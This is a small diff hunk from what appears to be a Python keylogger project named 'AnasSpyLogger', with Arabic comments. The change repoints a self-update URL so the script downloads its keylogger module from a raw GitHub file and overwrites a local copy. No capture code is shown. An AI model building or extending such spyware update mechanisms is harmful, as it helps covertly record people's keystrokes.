@@ -3,7 +3,7 @@ import requests
 from tool import anasspylogger
 
 # رابط التحديث المباشر للسكريبت
-update_url = "https://raw.githubusercontent.com/anaslabrini/test-keylogger.py/refs/heads/main/test-keylogger.py"
+update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"
 target_file = "tool/anasspylogger.py"  # الملف المستهدف للتحديث
 
 def clear_screen():
